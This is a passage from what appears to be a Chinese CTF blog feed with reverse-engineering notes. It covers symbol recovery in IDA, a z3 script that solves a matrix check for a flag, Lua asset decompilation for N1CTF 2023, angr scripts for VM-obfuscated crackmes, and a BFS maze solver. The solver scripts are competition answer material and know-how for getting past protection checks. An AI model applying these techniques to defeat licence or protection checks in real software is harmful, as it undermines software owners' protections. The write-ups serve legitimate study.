href="https://blog.51cto.com/u_13999641/5101994">文章</a>生成demo，编译完成后使用bindiff恢复符号(这里我bindiff的插件恢复报错，直接IDA import symbols / comments，然后函数名很诡异，感觉是有的字符识别不出来)。</p><p>​知识点：在 oatpp 框架中，HTTP 响应的处理通常发生在控制器(Controller)或请求处理器(Request Handler)中。具体来说，当 oatpp 接收到一个 HTTP 请求时，它会根据路由配置找到相应的控制器或请求处理器，并由它们来处理请求并生成相应的 HTTP 响应。在这个过程中，响应的创建和处理通常在控制器或请求处理器中完成。具体的处理代码可能涉及到 oatpp 框架提供的一系列类和方法，如 <code>oatpp::web::protocol::http::outgoing::ResponseFactory</code> 和其他相关类。</p><p>​就是指的下面这个</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 自定义请求处理程序</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Handler</span> : <span class="hljs-keyword">public</span> oatpp::web::server::HttpRequestHandler<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 处理传入的请求，并返回响应</span><br>    <span class="hljs-function">std::shared_ptr&lt;OutgoingResponse&gt; <span class="hljs-title">handle</span><span class="hljs-params">(<span class="hljs-type">const</span> std::shared_ptr&lt;IncomingRequest&gt;&amp; request)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>        <span class="hljs-built_in">O_UNUSED</span>(request);<br><br>        <span class="hljs-keyword">return</span> ResponseFactory::<span class="hljs-built_in">createResponse</span>(Status::CODE_200, <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>​然后查找此函数的交叉引用，发现 <code>sub_40617E</code> 是关键函数，分析此函数。这里 <code>v16</code> 与 <code>v17</code> (截图的上面memcpy) 都被赋值进行操作，所以猜测需要还原 <code>v15</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307252202050.png" alt="image-20230725220207925" /></p><p>​之后根据对 <code>v16</code> 的判断作为决定条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v16 = [<span class="hljs-number">0</span>]*<span class="hljs-number">40</span><br>v16[<span class="hljs-number">0</span>] = <span class="hljs-number">33211</span><br>v16[<span class="hljs-number">1</span>] = <span class="hljs-number">36113</span><br>v16[<span class="hljs-number">2</span>] = <span class="hljs-number">28786</span><br>v16[<span class="hljs-number">3</span>] = <span class="hljs-number">44634</span><br>v16[<span class="hljs-number">4</span>] = <span class="hljs-number">30174</span><br>v16[<span class="hljs-number">5</span>] = <span class="hljs-number">39163</span><br>v16[<span class="hljs-number">6</span>] = <span class="hljs-number">34923</span><br>v16[<span class="hljs-number">7</span>] = <span class="hljs-number">44333</span><br>v16[<span class="hljs-number">8</span>] = <span class="hljs-number">33574</span><br>v16[<span class="hljs-number">9</span>] = <span class="hljs-number">23555</span><br>v16[<span class="hljs-number">10</span>] = <span class="hljs-number">35015</span><br>v16[<span class="hljs-number">11</span>] = <span class="hljs-number">42724</span><br>v16[<span class="hljs-number">12</span>] = <span class="hljs-number">34160</span><br>v16[<span class="hljs-number">13</span>] = <span class="hljs-number">49166</span><br>v16[<span class="hljs-number">14</span>] = <span class="hljs-number">35770</span><br>v16[<span class="hljs-number">15</span>] = <span class="hljs-number">45984</span><br>v16[<span class="hljs-number">16</span>] = <span class="hljs-number">39754</span><br>v16[<span class="hljs-number">17</span>] = <span class="hljs-number">51672</span><br>v16[<span class="hljs-number">18</span>] = <span class="hljs-number">38323</span><br>v16[<span class="hljs-number">19</span>] = <span class="hljs-number">27511</span><br>v16[<span class="hljs-number">20</span>] = <span class="hljs-number">31334</span><br>v16[<span class="hljs-number">21</span>] = <span class="hljs-number">34214</span><br>v16[<span class="hljs-number">22</span>] = <span class="hljs-number">28014</span><br>v16[<span class="hljs-number">23</span>] = <span class="hljs-number">41090</span><br>v16[<span class="hljs-number">24</span>] = <span class="hljs-number">29258</span><br>v16[<span class="hljs-number">25</span>] = <span class="hljs-number">37905</span><br>v16[<span class="hljs-number">26</span>] = <span class="hljs-number">33777</span><br>v16[<span class="hljs-number">27</span>] = <span class="hljs-number">39812</span><br>v16[<span class="hljs-number">28</span>] = <span class="hljs-number">29442</span><br>v16[<span class="hljs-number">29</span>] = <span class="hljs-number">22225</span><br>v16[<span class="hljs-number">30</span>] = <span class="hljs-number">30853</span><br>v16[<span class="hljs-number">31</span>] = <span class="hljs-number">35330</span><br>v16[<span class="hljs-number">32</span>] = <span class="hljs-number">30393</span><br>v16[<span class="hljs-number">33</span>] = <span class="hljs-number">41247</span><br>v16[<span class="hljs-number">34</span>] = <span class="hljs-number">30439</span><br>v16[<span class="hljs-number">35</span>] = <span class="hljs-number">39434</span><br>v16[<span class="hljs-number">36</span>] = <span class="hljs-number">31587</span><br>v16[<span class="hljs-number">37</span>] = <span class="hljs-number">46815</span><br>v16[<span class="hljs-number">38</span>] = <span class="hljs-number">35205</span><br>v16[<span class="hljs-number">39</span>] = <span class="hljs-number">20689</span><br><br>v17 = [<span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x00000029</span>, <span class="hljs-number">0x00000029</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x00000021</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000045</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x00000029</span>, <span class="hljs-number">0x00000040</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x00000038</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x0000003E</span>, <span class="hljs-number">0x00000046</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x00000044</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000038</span>, <span class="hljs-number">0x0000005C</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000040</span>, <span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x0000003A</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000040</span>, <span class="hljs-number">0x00000053</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x00000034</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x00000059</span>, <span class="hljs-number">0x0000004C</span>, <span class="hljs-number">0x00000044</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000034</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000039</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x0000005C</span>, <span class="hljs-number">0x0000005D</span>, <span class="hljs-number">0x0000003A</span>, <span class="hljs-number">0x00000054</span>, <span class="hljs-number">0x0000004A</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x00000037</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x00000038</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x0000004D</span>, <span class="hljs-number">0x0000005C</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000025</span>, <span class="hljs-number">0x00000043</span>, <span class="hljs-number">0x0000003C</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x00000026</span>, <span class="hljs-number">0x00000057</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x00000010</span>]<br>v15 = [Int(<span class="hljs-string">&quot;v15[%d]&quot;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>)]<span class="hljs-comment"># 创建了&quot;v15[i]&quot;这种参数</span><br>s = Solver()<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            v16[<span class="hljs-number">10</span> * k + m] -= v15[<span class="hljs-number">10</span> * k + n] * v17[<span class="hljs-number">10</span> * n + m]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        s.add(v16[<span class="hljs-number">10</span>*i+j] == <span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> s.check() == z3.sat:<br>    m = s.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(m[v15[i]].as_long()), end=<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment"># 从m中取出标号为”v15[i]“的值，然后转化为字符串</span><br></code></pre></td></tr></table></figure><h1 id="n1ctf-2023"><a class="markdownIt-Anchor" href="#n1ctf-2023"></a> N1CTF 2023</h1><h2 id="n1lua"><a class="markdownIt-Anchor" href="#n1lua"></a> N1Lua</h2><ul><li>首先使用 <code>AssetStudio</code> 把 <code>n1llua_Data目录</code>下的 <code>resources.assets文件</code> 进行解密(有报错直接点击确定即可), 之后得到 <code>main.lua文件</code>, 之后使用 <code>java -jar unluac_2023_09_20.jar --rawstring .\main.lua &gt; src.lua </code> 将<code>编译后的main.lua反编译为lua程序</code></li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>相关资料及题型</title>
    <link href="/posts/436bbb1a.html"/>
    <url>/posts/436bbb1a.html</url>
    
    <content type="html"><![CDATA[<h1 id="软件保护技术"><a class="markdownIt-Anchor" href="#软件保护技术"></a> 软件保护技术</h1><h2 id="vm虚拟机"><a class="markdownIt-Anchor" href="#vm虚拟机"></a> VM虚拟机</h2><h3 id="理论研究"><a class="markdownIt-Anchor" href="#理论研究"></a> 理论研究</h3><p><a href="https://equinox-shame.github.io/2022/07/04/VM%EF%BC%9A%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/">理论</a></p><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><h4 id="gwctf-2019babyvm"><a class="markdownIt-Anchor" href="#gwctf-2019babyvm"></a> [GWCTF 2019]babyvm</h4><h5 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h5><ul><li><p>关注这里的vm初始化操作，将传递进来的局部变量进行处理，前4个有效位置为寄存器，后面的通过 <code>0xF1</code> 等字节表示需要进行的 <code>sub</code> 函数操作。注意这里的 <code>a1</code> 存储的都是地址坐标，具体实现需要到程序段索引。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305072226346.png" alt="image-20230507222653297" /></p></li><li><p>之后就是模拟执行 <code>opcode</code> ，找到程序的逻辑，之后反推</p></li></ul><h5 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h5><p>​这里使用angr不能得到正确答案，因为在主函数中有一个虚假的判断，而按照 <code>opcode</code> 模拟逻辑得到的是两段过程，其中第一段符合最后的 <code>check</code> 判定，从而 <code>angr</code> 识别这个判断为正确答案，即最后输出这个错误的答案</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305072257567.png" alt="image-20230507225731537" /></p><h4 id="nctf-2018wcyvm"><a class="markdownIt-Anchor" href="#nctf-2018wcyvm"></a> [NCTF 2018]wcyvm</h4><h5 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h5><ul><li><p>直接分析可以得到逻辑，这里 <code>v4</code> 表示的就是寄存器，而 <code>v5</code> 就是表示的存储  <code>opcode</code> 的地方，可以按其逻辑进行操作</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305072237892.png" alt="image-20230507223733797" /></p></li><li><p>也可以直接使用 <code>angr</code> 碰碰运气，直接硬推出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>p=angr.Project(<span class="hljs-string">&quot;./WcyVM&quot;</span>)         <span class="hljs-comment">#加载文件</span><br>state=p.factory.entry_state()          <span class="hljs-comment">#创造状态state， entry_state构造一个从函数入口点执行的状态</span><br>sm=p.factory.simgr(state)              <span class="hljs-comment">#模拟管理器</span><br>good=<span class="hljs-number">0x401366</span>                         <span class="hljs-comment">#想要的地址</span><br>sm.explore(find=good,avoid=<span class="hljs-number">0x401372</span>)<br><span class="hljs-keyword">if</span> sm.found:                           <span class="hljs-comment">#如果found分类不为空</span><br>    find_state=sm.found[<span class="hljs-number">0</span>]             <span class="hljs-comment">#found里的状态给find_state</span><br>    <span class="hljs-built_in">print</span>(find_state.posix.dumps(<span class="hljs-number">0</span>))    <span class="hljs-comment">#获取输入</span><br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305072240623.png" alt="image-20230507224004604" /></p></li></ul><h4 id="其余"><a class="markdownIt-Anchor" href="#其余"></a> 其余</h4><ul><li>[UNCTF] EasyVM <a href="https://equinox-shame.github.io/2022/07/22/UNCTF%20-%202019%20EasyVm/">EasyVM</a></li><li>[DASCTF]E4sy_Mix <a href="https://equinox-shame.github.io/2022/07/29/DASCTF%202022.07%20E4sy_Mix%20%E5%A4%8D%E7%8E%B0/">E4sy_Mix</a></li><li>[D3CTF]d3sky <a href="https://equinox-shame.github.io/2023/05/06/d3sky%20%E5%A4%8D%E7%8E%B0/">d3sky</a> <a href="https://ppppz.net/2023/08/03/D3CTF2023-REVERSE/">d3sky–PZ</a></li></ul><h2 id="maze"><a class="markdownIt-Anchor" href="#maze"></a> Maze</h2><h3 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h3><p>​直接py代码进行查找<a href="https://blog.csdn.net/qq_41890466/article/details/116900574">python求迷宫最短路径-小黄怪-的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Created on Tue Apr 27 13:48:14 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">@author: Administrator</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">###无递归、类求迷宫最短路径算法</span><br><span class="hljs-comment">#import random</span><br>pre_route=<span class="hljs-built_in">list</span>()    <span class="hljs-comment">#宽度搜索得到的节点</span><br>q=<span class="hljs-built_in">list</span>()    <span class="hljs-comment">#队列结构控制循环次数</span><br>xx=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]   <span class="hljs-comment">#右移、下移、左移、上移</span><br>yy=[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>]<br>visited=<span class="hljs-built_in">list</span>()  <span class="hljs-comment">#记录节点是否已遍历</span><br>father=<span class="hljs-built_in">list</span>()   <span class="hljs-comment">#每一个pre_route节点的父节点</span><br>route=<span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bfs</span>(<span class="hljs-params">l,x,y,m,n</span>):<br>    visited=[[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l[<span class="hljs-number">0</span>]))]<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l))]<br>    visited[x][y]=<span class="hljs-number">1</span> <span class="hljs-comment">#入口节点设置为已遍历</span><br>    q.append([x,y])<br>    <span class="hljs-keyword">while</span> q:    <span class="hljs-comment">#队列为空则结束循环</span><br>        now=q[<span class="hljs-number">0</span>]<br>        q.pop(<span class="hljs-number">0</span>)    <span class="hljs-comment">#移除队列头结点</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            point=[now[<span class="hljs-number">0</span>]+xx[i],now[<span class="hljs-number">1</span>]+yy[i]]   <span class="hljs-comment">#当前节点</span><br>            <span class="hljs-keyword">if</span> point[<span class="hljs-number">0</span>]&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> point[<span class="hljs-number">1</span>]&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> point[<span class="hljs-number">0</span>]&gt;=<span class="hljs-built_in">len</span>(l) <span class="hljs-keyword">or</span> point[<span class="hljs-number">1</span>]&gt;=<span class="hljs-built_in">len</span>(l[<span class="hljs-number">0</span>]) <span class="hljs-keyword">or</span> visited[point[<span class="hljs-number">0</span>]][point[<span class="hljs-number">1</span>]]==<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> l[point[<span class="hljs-number">0</span>]][point[<span class="hljs-number">1</span>]]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>                <span class="hljs-keyword">continue</span><br>            father.append(now)<br>            visited[point[<span class="hljs-number">0</span>]][point[<span class="hljs-number">1</span>]]=<span class="hljs-number">1</span><br>            q.append(point)<br>            pre_route.append(point)<br>            <span class="hljs-keyword">if</span> point[<span class="hljs-number">0</span>]==m <span class="hljs-keyword">and</span> point[<span class="hljs-number">1</span>]==n:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;false&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_route</span>(<span class="hljs-params">father,pre_route</span>):    <span class="hljs-comment">#输出最短迷宫路径</span><br>    route=[pre_route[-<span class="hljs-number">1</span>],father[-<span class="hljs-number">1</span>]]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pre_route)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> pre_route[i]==route[-<span class="hljs-number">1</span>]:<br>            route.append(father[i])<br>    route.reverse()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;迷宫最短路径为：\n&quot;</span>,route)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;步长：&quot;</span>,<span class="hljs-built_in">len</span>(route)-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> route<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prn_map</span>(<span class="hljs-params">route,l,m,n</span>):   <span class="hljs-comment">#打印包含路径的迷宫图</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l)):<br>        l[i]=<span class="hljs-built_in">list</span>(l[i])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(route)):<br>        l[route[i][<span class="hljs-number">0</span>]][route[i][<span class="hljs-number">1</span>]]=<span class="hljs-string">&#x27;2&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l[<span class="hljs-number">0</span>])):<br>            <span class="hljs-keyword">if</span> l[i][j]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  &#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">elif</span> l[i][j]==<span class="hljs-string">&#x27;0&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;██&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;░░&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> i==m <span class="hljs-keyword">and</span> j==n:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;☀&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>()<br><br>l=[<span class="hljs-string">&#x27;01010101001011001001010110010110100100001000101010&#x27;</span>,<br>   <span class="hljs-string">&#x27;00001000100000101010010000100000001001100110100101&#x27;</span>,<br>   <span class="hljs-string">&#x27;01111011010010001000001101001011100011000000010000&#x27;</span>,<br>   <span class="hljs-string">&#x27;01000000001010100011010000101000001010101011001011&#x27;</span>,<br>   <span class="hljs-string">&#x27;00011111000000101000010010100010100000101100000000&#x27;</span>,<br>   <span class="hljs-string">&#x27;11001000110101000010101100011010011010101011110111&#x27;</span>,<br>   <span class="hljs-string">&#x27;00011011010101001001001010000001000101001110000000&#x27;</span>,<br>   <span class="hljs-string">&#x27;10100000101000100110101010111110011000010000111010&#x27;</span>,<br>   <span class="hljs-string">&#x27;00111000001010100001100010000001000101001100001001&#x27;</span>,<br>   <span class="hljs-string">&#x27;11000110100001110010001001010101010101010001101000&#x27;</span>,<br>   <span class="hljs-string">&#x27;00010000100100000101001010101110100010101010000101&#x27;</span>,<br>   <span class="hljs-string">&#x27;11100100101001001000010000010101010100100100010100&#x27;</span>,<br>   <span class="hljs-string">&#x27;00000010000000101011001111010001100000101010100011&#x27;</span>,<br>   <span class="hljs-string">&#x27;10101010011100001000011000010110011110110100001000&#x27;</span>,<br>   <span class="hljs-string">&#x27;10101010100001101010100101000010100000111011101001&#x27;</span>,<br>   <span class="hljs-string">&#x27;10000000101100010000101100101101001011100000000100&#x27;</span>,<br>   <span class="hljs-string">&#x27;10101001000000010100100001000100000100011110101001&#x27;</span>,<br>   <span class="hljs-string">&#x27;00101001010101101001010100011010101101110000110101&#x27;</span>,<br>   <span class="hljs-string">&#x27;11001010000100001100000010100101000001000111000010&#x27;</span>,<br>   <span class="hljs-string">&#x27;00001000110000110101101000000100101001001000011101&#x27;</span>,<br>   <span class="hljs-string">&#x27;10100101000101000000001110110010110101101010100001&#x27;</span>,<br>   <span class="hljs-string">&#x27;00101000010000110101010000100010001001000100010101&#x27;</span>,<br>   <span class="hljs-string">&#x27;10100001000110010001000010101001010101011111010010&#x27;</span>,<br>   <span class="hljs-string">&#x27;00000100101000000110010100101001000001000000000010&#x27;</span>,<br>   <span class="hljs-string">&#x27;11010000001001110111001001000011101001011011101000&#x27;</span>,<br>   <span class="hljs-string">&#x27;00000110100010001000100000001000011101000000110011&#x27;</span>,<br>   <span class="hljs-string">&#x27;10101000101000100010001111100010101001010000001000&#x27;</span>,<br>   <span class="hljs-string">&#x27;10000010100101001010110000000100101010001011101000&#x27;</span>,<br>   <span class="hljs-string">&#x27;00111100001000010000000110111000000001000000001011&#x27;</span>,<br>   <span class="hljs-string">&#x27;10000001100111010111010001000110111010101101111000&#x27;</span>]<br><br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    x=<span class="hljs-number">0</span>;y=<span class="hljs-number">0</span><br>    m=<span class="hljs-number">25</span>;n=<span class="hljs-number">40</span><br>    <span class="hljs-keyword">if</span> bfs(l,x,y,m,n)==<span class="hljs-number">1</span>:<br>        route=get_route(father,pre_route)<br>        prn_map(route,l,m,n)<br></code></pre></td></tr></table></figure><h3 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h3><h4 id="领航杯maze"><a 